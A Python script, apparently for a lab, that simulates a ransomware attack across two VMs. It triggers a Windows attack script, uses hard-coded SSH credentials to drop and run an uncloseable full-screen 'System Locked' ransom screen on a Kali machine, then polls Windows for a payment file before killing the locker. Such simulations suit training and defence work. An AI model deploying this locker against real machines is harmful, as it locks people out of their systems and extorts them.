#!/usr/bin/env python3
import sys
import paramiko
import time
import subprocess

# --- LAB CREDENTIALS ---
TARGET_KALI = "172.16.1.100"
TARGET_WIN = "172.16.1.102"
USERNAME = "CEO"
PASSWORD = "CEOPass123!"

def attack_windows():
    print("[*] Step 1: Attacking Windows VM...")
    # Execute the existing Windows attack script
    try:
        subprocess.run(["python3", "execute_attack.py"], check=True)
        print("[+] Windows attack launched.")
    except Exception as e:
        print(f"[-] Failed to launch Windows attack: {e}")
        sys.exit(1)

def attack_kali():
    print("[*] Step 2: Attacking Kali VM...")
    
    # The Kali Tkinter Payload (No password prompt here, it just waits to be killed)
    payload_script = """#!/usr/bin/env python3
import tkinter as tk
import time
import subprocess
import threading

def force_fullscreen():
    time.sleep(0.5)
    try:
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowmove", "0", "0"], check=False)
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowsize", "100%", "100%"], check=False)
        subprocess.run(["xdotool", "search", "--name", "System Locked", "windowraise"], check=False)
    except Exception:
        pass

root = tk.Tk()
root.title("System Locked")
root.configure(background='black')
root.overrideredirect(True)
screen_width = root.winfo_screenwidth()
screen_height = root.winfo_screenheight()
root.geometry(f"{screen_width}x{screen_height}+0+0")
root.attributes('-topmost', True) 

lbl = tk.Label(root, text="Your Kali files have been simulated-encrypted!\\n\\nPay the ransom on the Windows Device to unlock BOTH machines.", 
               fg="lime", bg="black", font=("Courier", 26, "bold"))
lbl.pack(expand=True, fill='both')

root.protocol("WM_DELETE_WINDOW", lambda: None)
threading.Thread(target=force_fullscreen, daemon=True).start()
root.mainloop()
"""

    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(TARGET_KALI, username=USERNAME, password=PASSWORD)
        
        sftp = ssh.open_sftp()
        with sftp.file('/tmp/ransom_sim.py', 'w') as f:
            f.write(payload_script)
        ssh.exec_command("chmod +x /tmp/ransom_sim.py")
        sftp.close()

        exec_cmd = (
            f"export DISPLAY=:0; "
            f"export XAUTHORITY=/home/{USERNAME}/.Xauthority; "
            f"nohup python3 /tmp/ransom_sim.py > /tmp/gui_out.log 2>&1 &"
        )
        ssh.exec_command(exec_cmd)
        print("[+] Kali attack launched.")
        return ssh
    except Exception as e:
        print(f"[-] Failed to launch Kali attack: {e}")
        sys.exit(1)

def monitor_windows(ssh_kali):
    print("[*] Step 3: Monitoring Windows for payment...")
    print("    (Pay the ransom on the Windows VM to release both machines)")
    
    try:
        win_ssh = paramiko.SSHClient()
        win_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        win_ssh.connect(TARGET_WIN, username=USERNAME, password=PASSWORD)
    except Exception as e:
        print(f"[-] Monitor could not connect to Windows: {e}")
        return

    while True:
        time.sleep(2) # Check every 2 seconds
        try:
            stdin, stdout, stderr = win_ssh.exec_command('if exist C:\\Windows\\Temp\\PAID.txt (echo FOUND)')
            result = stdout.read().decode().strip()
            
            if "FOUND" in result:
                print("\n[+] Payment detected on Windows VM! Ending Kali simulation...")
                # Kill the Kali GUI remotely
                ssh_kali.exec_command("pkill -f ransom_sim.py")
                # Clean up the paid file
                win_ssh.exec_command('del C:\\Windows\\Temp\\PAID.txt')
                break
        except Exception:
            break
            
    win_ssh.close()
    ssh_kali.close()
    print("[+] All simulations complete.")

if __name__ == "__main__":
    print("=== STARTING CHAIN REACTION ATTACK ===")
    
    # 1. Hit Windows
    attack_windows()
    
    # 2. Hit Kali
    kali_ssh_conn = attack_kali()
    
    # 3. Wait for Windows to be paid, then kill Kali
    monitor_windows(kali_ssh_conn)
